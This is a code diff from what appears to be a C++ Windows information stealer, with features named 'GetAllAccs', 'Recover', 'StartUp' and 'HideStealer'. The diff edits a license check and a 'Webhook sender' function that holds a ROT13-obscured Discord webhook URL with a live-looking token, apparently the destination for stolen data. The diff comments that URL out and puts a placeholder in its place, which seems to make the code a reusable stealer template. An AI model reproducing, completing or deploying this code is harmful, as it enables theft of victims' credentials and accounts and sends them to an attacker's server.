@@ -48,8 +48,8 @@ void WriteTempContent(string Content);
 
 INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
 {
-    string License = "[mohvyqre{J2N7U6YJ}]";
-    //string License = "[zbuilder{zbuilder}]";
+    //string License = "[mohvyqre{J2N7U6YJ}]";
+    string License = "[zbuilder{zbuilder}]";
     if (VerifyLicense(decrypt(License)))
     {
         string Feature = "[Tracer:(Y)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]";
@@ -778,8 +778,8 @@ int DownloadFile(string url, string path)
 // Webhook sender
 void SendMessage(string Message, string ContentType)
 {
-    //string s = decrypt("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
-    string s = decrypt("uggcf://qvfpbeqncc.pbz/ncv/jroubbxf/743596214515138653/U_rvrPadWvleuPPT2Wy_JiOWhqnMaEwad-Yf-BuGogwgSpRW3DCDIVIhO6IA2IninHvK[][]");
+    string s = decrypt("[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]");
+    //string s = decrypt("uggcf://qvfpbeqncc.pbz/ncv/jroubbxf/743596214515138653/U_rvrPadWvleuPPT2Wy_JiOWhqnMaEwad-Yf-BuGogwgSpRW3DCDIVIhO6IA2IninHvK[][]");
     size_t LocateBegin = s.find("[");
     size_t LocateEnd = s.find("]");
     if (LocateBegin > LocateEnd)
